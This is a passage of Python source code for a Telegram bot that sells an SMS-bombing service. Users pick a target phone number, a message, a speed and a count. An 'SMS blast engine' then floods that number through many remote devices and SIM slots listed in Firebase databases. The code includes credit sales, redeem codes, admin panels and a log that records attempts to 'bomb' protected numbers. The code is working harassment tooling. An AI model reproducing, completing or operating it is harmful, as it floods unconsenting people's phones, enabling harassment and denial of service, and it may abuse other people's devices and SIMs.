        [
            InlineKeyboardButton(text="💳 Pricing Plans", callback_data="owner:pricing:menu"),
            InlineKeyboardButton(text="🎁 Redeem Codes", callback_data="owner:redeem:menu")
        ],
        [
            InlineKeyboardButton(text="💰 Add Credits", callback_data="owner:credits:add"),
            InlineKeyboardButton(text="💰 Deduct Credits", callback_data="owner:credits:deduct")
        ],
        [
            InlineKeyboardButton(text="🔗 Force Join", callback_data="owner:fj:menu"),
            InlineKeyboardButton(text="⚙️ Settings", callback_data="owner:settings")
        ],
        [
            InlineKeyboardButton(text="🔒 Protected Numbers", callback_data="owner:protected:menu"),
            InlineKeyboardButton(text="📋 SMS History", callback_data="owner:sms_history")
        ],
        [
            InlineKeyboardButton(text="📤 Export Script", callback_data="owner:export_script"),
            InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])
        ],
        [
            InlineKeyboardButton(text="🔍 Number Tracker", callback_data="owner:number_tracker"),
            InlineKeyboardButton(text="🔄 Refresh", callback_data="owner:refresh")
        ],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📤 Send SMS", callback_data="admin:send")
        ],
        [
            InlineKeyboardButton(text="👥 View Users", callback_data="admin:users:list"),
            InlineKeyboardButton(text="📊 API Stats", callback_data="admin:stats")
        ],
        [
            InlineKeyboardButton(text="🚫 Ban User", callback_data="admin:ban"),
            InlineKeyboardButton(text="✅ Unban User", callback_data="admin:unban:menu")
        ],
        [
            InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast")
        ],
        [
            InlineKeyboardButton(text="🔒 Protected Numbers", callback_data="admin:protected:menu")
        ],
        [
            InlineKeyboardButton(text="🔍 Number Tracker", callback_data="admin:number_tracker"),
            InlineKeyboardButton(text="🔄 Refresh", callback_data="admin:refresh")
        ],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Send SMS", callback_data="user:send")],
        [
            InlineKeyboardButton(text="💳 Credits", callback_data="user:credits"),
            InlineKeyboardButton(text="🎁 Redeem", callback_data="user:redeem")
        ],
        [
            InlineKeyboardButton(text="👥 Refer", callback_data="user:refer"),
            InlineKeyboardButton(text="📊 Stats", callback_data="user:stats")
        ],
        [InlineKeyboardButton(text="📜 My SMS History", callback_data="user:sms_history")],
        [InlineKeyboardButton(text="💰 Buy Credits", callback_data="user:pricing")],
        [InlineKeyboardButton(text="ℹ️ Info", callback_data="user:info")],
    ])

def fb_menu_kb(d: dict) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    rows = [[InlineKeyboardButton(text="➕ Add Firebase", callback_data="owner:fb:add")]]
    
    display_fbs = fbs[:50]
    for fb in display_fbs:
        label = fb.get("label", fb["url"][:28])
        rows.append([
            InlineKeyboardButton(text=f"🔥 {label[:28]}", callback_data="noop"),
            InlineKeyboardButton(text="🗑 Remove", callback_data=f"owner:fb:del:{fb['id']}")
        ])
    
    if len(fbs) > 50:
        rows.append([InlineKeyboardButton(text=f"📊 +{len(fbs)-50} more DBs", callback_data="noop")])
    
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="owner:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([InlineKeyboardButton(text="➕ Add Super Admin", callback_data="owner:owners:add")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([InlineKeyboardButton(text=f"👑 {oid} (Main)", callback_data="noop")])
        else:
            rows.append([
                InlineKeyboardButton(text=f"🔱 {oid}", callback_data="noop"),
                InlineKeyboardButton(text="🗑 Remove", callback_data=f"owner:owners:del:{oid}")
            ])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="owner:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[InlineKeyboardButton(text="➕ Add Admin", callback_data="owner:admins:add")]]
    for aid in admins:
        rows.append([
            InlineKeyboardButton(text=f"🛡 {aid}", callback_data="noop"),
            InlineKeyboardButton(text="🗑 Remove", callback_data=f"owner:admins:del:{aid}")
        ])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="owner:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([InlineKeyboardButton(text=f"🔓 {bid}", callback_data=f"{prefix}:unban:do:{bid}")])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data=f"{prefix}:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"👥 <b>Users ({len(items)} total)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = "🚫"
        elif uid in approved: status = "✅"
        elif is_owner(uid, d): status = "👑"
        elif uid in d["admins"]: status = "🛡"
        else: status = "👤"
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | 💰{credits} | 📤{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="◀️ Prev", callback_data=f"{prefix}:users:pg:{page-1}"))
    if start + per < len(items): nav.append(InlineKeyboardButton(text="▶️ Next", callback_data=f"{prefix}:users:pg:{page+1}"))
    if nav: rows.append(nav)
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data=f"{prefix}:home")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    lines = [
        f"📊 <b>API Stats</b>\n",
        f"📤 Total Sent   : <b>{stats.get('total_sent', 0)}</b>",
        f"❌ Total Failed : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        "<b>Per Firebase:</b>"
    ]
    if not api_use:
        lines.append("  No usage yet.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"🔥 {label}\n   ✅ {sent} sent  ❌ {failed} failed")
    return "\n".join(lines)

# ============== PROTECTED NUMBERS MENU ==============

def protected_numbers_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add Protected Number", callback_data=f"{prefix}:protected:add")],
        [InlineKeyboardButton(text="🗑 Remove Protected Number", callback_data=f"{prefix}:protected:remove")],
        [InlineKeyboardButton(text="🔙 Back", callback_data=f"{prefix}:home")]
    ])

def protected_list_text(d: dict, viewer_uid: int) -> str:
    """Show protected numbers with appropriate masking"""
    protected = d.get("protected_numbers", [])
    if not protected:
        return "🔒 <b>Protected Numbers</b>\n\n<i>Koi protected number nahi hai.</i>"
    
    is_viewer_owner = is_owner(viewer_uid, d)
    
    text = f"🔒 <b>Protected Numbers</b>\n\nTotal: <b>{len(protected)}</b>\n\n"
    for i, num in enumerate(protected, 1):
        if is_viewer_owner:
            display = num  # Full number for owners
        else:
            display = mask_number_for_admin(num)  # Masked for admins
        text += f"{i}. <code>{display}</code>\n"
    return text

# ============== NUMBER TRACKER ==============

def number_tracker_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔍 Check Number Usage", callback_data=f"{prefix}:tracker:check")],
        [InlineKeyboardButton(text="📊 View All Tracked Numbers", callback_data=f"{prefix}:tracker:list")],
        [InlineKeyboardButton(text="🔙 Back", callback_data=f"{prefix}:home")]
    ])

# ============== ROUTER ==============

R = Router()

# ============== COMMAND HANDLERS ==============

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    name = msg.from_user.full_name or "User"
    d = load()
    reg_user(uid, name, d)
    save(d)

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(
            force_join_text(missing),
            reply_markup=force_join_kb(missing),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer("🚫 <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer("⛔ <b>Access nahi hai!</b>\n\nOwner se approval lein.", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(
                force_join_text(missing),
                reply_markup=force_join_kb(missing),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except:
            pass
        return

    await cq.answer("✅ Verified!", show_alert=True)
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ============== USER SMS SENDING ==============

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    add_protected_number = State()
    remove_protected_number = State()
    tracker_check_number = State()

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        "📞 <b>Step 1/4 — Number</b>\n\n"
        "Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([("❌ Cancel", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number. Dobara bhejo (e.g. +919876543210):")
        return
    
    d = load()
    uid = msg.from_user.id
    
    # Track number usage
    track_number_usage(d, uid, number, "attempted")
    
    if is_number_protected(number, d):
        await notify_protected_attempt(msg.bot, uid, number, d)
        log_activity(d, "protected_attempt", uid, f"Tried to bomb protected number: {number}")
        save(d)
        display = get_number_display(number, uid, d)
        await msg.answer(
            f"🚫 <b>This number is PROTECTED!</b>\n\n"
            f"📞 Number: <code>{display}</code>\n\n"
            f"⚠️ You cannot send SMS to this number. This attempt has been reported.",
            reply_markup=kb([("🏠 Home", "user:home")]),
            parse_mode="HTML"
        )
        return
    
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"✅ Number: <code>{number}</code>\n\n💬 <b>Step 2/4 — Message</b>\n\nJo message bhejna hai woh type karo:",
        reply_markup=kb([("❌ Cancel", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"✅ Message saved!\n\n⚡ <b>Step 3/4 — Speed</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    count = len(devices)

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n💰 Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"📊 <b>Step 4/4 — Count</b>\n\n"
        f"🔥 Online APIs : <b>{count}</b>\n"
        f"📤 Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([("❌ Cancel", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer("❌ Sirf number bhejo (e.g. 5):")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if is_number_protected(number, d):
        await notify_protected_attempt(msg.bot, uid, number, d)
        log_activity(d, "protected_attempt", uid, f"Tried to bomb protected number: {number}")
        save(d)
        display = get_number_display(number, uid, d)
        await msg.answer(
            f"🚫 <b>This number is PROTECTED!</b>\n\n"
            f"📞 Number: <code>{display}</code>\n\n"
            f"⚠️ This attempt has been reported.",
            reply_markup=kb([("🏠 Home", "user:home")]),
            parse_mode="HTML"
        )
        return

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                "❌ <b>Aapke paas credits nahi hain!</b>\n\n"
                "💰 Credits kharidne ke liye contact karein:\n"
                f"👤 <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>",
                reply_markup=kb([("🏠 Home", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(f"⚠️ Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    if not devices:
        await msg.answer("😴 Koi API online nahi! Try later.", reply_markup=kb([("🏠 Home", "user:home")]))
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

# ============== SMS BLAST ENGINE ==============

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    # Limit concurrent sessions
    async with SESSIONS_LOCK:
        # Clean up completed sessions
        completed = []
        for uid_key, session in USER_SESSIONS.items():
            if session.task and session.task.done():
                completed.append(uid_key)
        for uid_key in completed:
            del USER_SESSIONS[uid_key]
        
        if len(USER_SESSIONS) >= MAX_CONCURRENT_SESSIONS:
            await msg.answer(
                "⚠️ <b>Bot currently busy!</b>\n\n"
                f"Maximum concurrent users: {MAX_CONCURRENT_SESSIONS}\n"
                "Please try after some time.",
                parse_mode="HTML"
            )
            return
        
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    "⚠️ <b>Ek sending already chal rahi hai!</b>\n"
                    "Pehle woh khatam hone do ya stop karein.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None

    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break

                async with session.lock:
                    if session.cancelled:
                        log.info(f"User {uid} stopped sending at {sent_ok + sent_fail}/{count}")
                        break

                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(MAX_CONCURRENT_SENDS_PER_USER, msgs_left)
                device_sent = 0

                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                            break

                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)

                    async with session.lock:
                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1

                            if is_regular_user:
                                d_temp = load()
                                deduct_credits(uid, 1, d_temp)
                                d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in d_temp["users"]:
                                    d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                                d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number,
                                    "message": message[:100],
                                    "timestamp": int(time.time()),
                                    "status": "sent"
                                })
                                save(d_temp)
                                
                                # Track successful send
                                d_temp = load()
                                track_number_usage(d_temp, uid, number, "sent")
                        else:
                            sent_fail += 1
                            msgs_left -= 1

                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or
                            session.cancelled):

                            current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML"
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now

                    await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task

    await task

    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)
    else:
        d_final = load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    if sent_fail == 0 and sent_ok > 0:
        icon = "✅"
    elif sent_ok > 0:
        icon = "⚠️"
    else:
        icon = "❌"

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n💰 Credits Used: <b>{sent_ok}</b>\n💳 Remaining: <b>{remaining}</b>"

    stopped_text = "\n🛑 <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n⏱ Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [("🔙 Owner Panel", "owner:home")]
    elif is_admin(uid, load()):
        back_btn = [("🔙 Admin Panel", "admin:home")]
    else:
        back_btn = [("📤 Send Another", "user:send"), ("🏠 Home", "user:home")]

    # Show number based on viewer role
    display_number = get_number_display(number, uid, load())

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"📞 To: <code>{display_number}</code>\n"
            f"💬 Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"✅ Sent: <b>{sent_ok}</b>\n"
            f"❌ Failed: <b>{sent_fail}</b>\n"
            f"🔥 APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=kb(*[[btn] for btn in back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id

    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return

        session.cancelled = True

    await cq.answer("🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)

    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await cq.message.edit_text(
            f"🛑 <b>Stopping...</b>\n\n"
            f"✅ Sent: <b>{current_sent}</b>\n"
            f"❌ Failed: <b>{current_failed}</b>\n\n"
            f"<i>Current sending complete hone ke baad ruk jayega...</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass

# ============== OWNER PANEL HANDLERS ==============

@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:fb:menu")
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Super Admin only!", show_alert=True)
        return
    await state.clear()
    await cq.message.edit_text(
        f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
        reply_markup=fb_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        "🔥 <b>Add Firebase</b>\n\nFirebase URL bhejo:\n"
        "<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([("❌ Cancel", "owner:fb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer("❌ URL must start with https://. Dobara bhejo:")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer("⚠️ Already added!", reply_markup=fb_menu_kb(d))
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ <b>Firebase Added!</b>\n\n🏷 {label}\n🔗 <code>{url}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True)
        return
    fb_id = cq.data.split("owner:fb:del:", 1)[1]
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await cq.message.edit_text(
        f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d),
        parse_mode="HTML"
    )

# ============== OWNER SMS SENDING ==============

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        "👑 <b>Super Admin SMS Send</b>\n\n"
        "📞 <b>Step 1/4 — Number</b>\n\n"
        "Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([("❌ Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number. Dobara bhejo (e.g. +919876543210):")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"✅ Number: <code>{number}</code>\n\n💬 <b>Step 2/4 — Message</b>\n\nJo message bhejna hai woh type karo:",
        reply_markup=kb([("❌ Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"✅ Message saved!\n\n⚡ <b>Step 3/4 — Speed</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "owner:speed:fast": SPEED_FAST,
        "owner:speed:medium": SPEED_MEDIUM,
        "owner:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"📊 <b>Step 4/4 — Count</b>\n\n"
        f"🔥 Online APIs : <b>{count}</b>\n"
        f"📤 Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([("❌ Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
